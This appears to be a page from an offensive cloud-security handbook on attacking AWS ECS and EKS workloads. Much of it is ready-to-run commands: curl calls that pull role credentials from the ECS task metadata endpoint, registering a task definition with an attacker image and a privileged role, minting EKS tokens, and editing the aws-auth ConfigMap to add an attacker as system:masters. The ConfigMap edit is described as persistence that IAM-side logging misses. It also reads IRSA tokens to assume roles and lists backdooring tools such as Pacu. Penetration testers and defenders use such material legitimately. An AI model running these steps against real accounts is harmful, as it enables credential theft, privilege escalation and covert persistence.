---
title: "Containers: ECS and EKS task-role and runtime abuse"
order: 3
description: "Attacking ECS and EKS workloads: task role theft through the task metadata endpoint, task-definition abuse, and reaching the container runtime."
keywords:
  - ECS
  - EKS
  - task role
  - task metadata
  - container
---

# Containers

AWS runs containers through ECS (its own orchestrator) and EKS (managed Kubernetes). Both attach an IAM role to the workload, and both expose a metadata endpoint inside the container that hands out that role's credentials, which makes container RCE an AWS credential-theft path. Writing a task definition is itself an execution primitive: you choose the image, command, and role it runs as.

## Stealing the task role (ECS)

```bash
# Inside an ECS task, the role creds come from the task metadata endpoint
curl -s ${ECS_CONTAINER_METADATA_URI_V4}/task
curl -s 169.254.170.2${AWS_CONTAINER_CREDENTIALS_RELATIVE_URI}
```

## Running your own task

```bash
# Register a task definition with your image and a privileged task role, then run it
aws ecs register-task-definition --family x --task-role-arn <privileged-role> \
  --container-definitions '[{"name":"c","image":"<you>/img","essential":true}]'
aws ecs run-task --cluster <c> --task-definition x
```

## EKS: from IAM into the cluster

EKS maps IAM principals to Kubernetes identities, so an IAM foothold with `eks:DescribeCluster` and a matching mapping becomes in-cluster access:

```bash
# mint a short-lived bearer token for the cluster from your IAM creds
aws eks get-token --cluster-name <cluster>

# write a kubeconfig that calls get-token under the hood, then act
aws eks update-kubeconfig --name <cluster>   # needs eks:DescribeCluster
kubectl auth can-i --list
```

The IAM-to-RBAC binding lives in the `aws-auth` ConfigMap (or newer access entries). With write access to it from a mapped principal, add your own ARN as a cluster admin and persist:

```bash
# grant your IAM user/role system:masters by editing the mapping
kubectl -n kube-system edit configmap aws-auth
# add under mapRoles/mapUsers:
#   - userarn: arn:aws:iam::<acct>:user/<you>
#     username: attacker
#     groups: [ "system:masters" ]
```

### IRSA and the node role

Pods authenticate to AWS two ways, both lootable:

- **Node instance role**: a pod that reaches the node IMDS (`169.254.169.254`) gets the worker node's instance-profile credentials, often broad. Blocking IMDS from pods is frequently missed.
- **IRSA (IAM Roles for Service Accounts)**: the pod's projected service-account token is exchanged for role credentials through the cluster OIDC provider. Read the token and assume the role directly:

```bash
TOKEN=$(cat /var/run/secrets/eks.amazonaws.com/serviceaccount/token)
aws sts assume-role-with-web-identity \
  --role-arn "$AWS_ROLE_ARN" --role-session-name x \
  --web-identity-token "$TOKEN" --query Credentials
```

## Exploitation notes

- `AWS_CONTAINER_CREDENTIALS_RELATIVE_URI` is the ECS equivalent of IMDS; a server-side request forgery inside a task reaches it just like EC2 SSRF reaches 169.254.169.254.
- Registering and running a task needs `iam:PassRole` on the task role, so it is also an identity privilege-escalation path; a task definition you control is arbitrary code under the task role.
- Editing `aws-auth` is durable in-cluster persistence: the added mapping survives until an operator notices it, and IAM-side logging does not show the ConfigMap change.
- IRSA role credentials are only as scoped as the role's trust-policy `sub` condition on the service account; a loose condition lets one pod assume another service account's role.
- Generic Kubernetes attacks (RBAC, service-account tokens, pod escape) live in the Containers area; the pages here stay on the AWS control-plane and node-identity angle.

## Tools

- **AWS CLI** (`ecs register-task-definition`, `run-task`, `eks update-kubeconfig`).
- **Pacu** (`ecs__enum`, `ecs__backdoor_task_def`): ECS enumeration and task-definition backdooring.
- **kubectl** / **Peirates**: in-cluster work on EKS.

## References

- [HackTricks Cloud: ECS and EKS](https://cloud.hacktricks.wiki/en/pentesting-cloud/aws-security/aws-services/aws-ecs-enum.html)
- [AWS: task IAM roles](https://docs.aws.amazon.com/AmazonECS/latest/developerguide/task-iam-roles.html)
- [Hacking the Cloud: AWS](https://hackingthe.cloud/)
- [Datadog Security Labs](https://securitylabs.datadoghq.com/)
- [Peirates (InGuardians)](https://github.com/inguardians/peirates)
